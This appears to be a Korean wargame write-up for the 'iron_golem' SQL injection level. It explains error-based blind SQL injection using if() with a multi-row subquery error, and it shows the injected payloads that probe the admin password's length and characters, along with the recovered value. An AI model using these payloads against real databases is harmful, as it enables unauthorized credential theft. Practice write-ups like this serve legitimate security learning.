## Q21.iron_golem _ Error Based
<img src="/photo/prob_21.PNG" width="100%" height="100%" alt="problem"></img>

### 제한 문자: sleep / benchmark <br> 문제 사항: admin의 패스워드를 찾아라.
### 해결책
```
이전 문제들은 참, 거짓에 따른 반응을 통해 문제를 해결
=> Blind SQL 문제들이었음
but. 이번 문제는 쿼리문의 에러만 보여줌
=> Errer Based Blind SQL 문제가 됨
```
```
조건이 참이면 정상 로드가 되고 거짓이면 SQL error가 떠야된다고 생각함
=> if문을 사용해야함
=> SQL if문의 error를 찾아봄
=> (select 1 union select 2) 서브쿼리를 통해 error를 발생시킬 수 있음
select 1 union select 2는 2개의 row를 반환함
but. if문은 1개의 row를 반환함 
=> ERROR 1242 (21000): Subquery returns more than 1 row 발생 
```
```
위의 error를 이용해 패스워드 길이를 찾아봄
=> length()함수 이용 ( 파이썬 사용 )
=> 밑의 쿼리가 참이므로 패스워드 길이 = 32
```
```diff
# 현재 쿼리문: where id='admin' and pw=''||id='admin' and if(length(pw)=32,1,(select 1 union select 2))-- '
```
<참고> Python 코드 : [패스워드 길이 탐색](code/21_pwlength.py)
```
다음으로 패스워드 각자리의 문자 확인
=> substr()함수, ascii()함수 이용 ( 파이썬 사용 )
```
```diff
# 현재 쿼리문: where id='admin' and pw=''||id='admin and if(ascii(substr(pw,1,1))=48,1,(select 1 union select 2))-- '
```
<참고> Python 코드 : [패스워드 길이 탐색](code/21_pw.py)
```
해결 쿼리문: where id='admin' and pw='06b5a6c16e8830475f983cc3a825ee9a'
```
### CERT <br> Python 코드 : [패스워드 길이 탐색](code/21_pwlength.py) / [패스워드 문자 탐색](code/21_pw.py)

### 느낀점
```diff
+ if문에 대해 알게 되었다.
+ 형식 : if(조건, '참일때 결과', '거짓일때 결과')
+ if문은 1개의 row를 반환함

- 쿼리문을 이용해 error를 띄우는 것이 어려웠고 많은 시간을 소모했다.
```
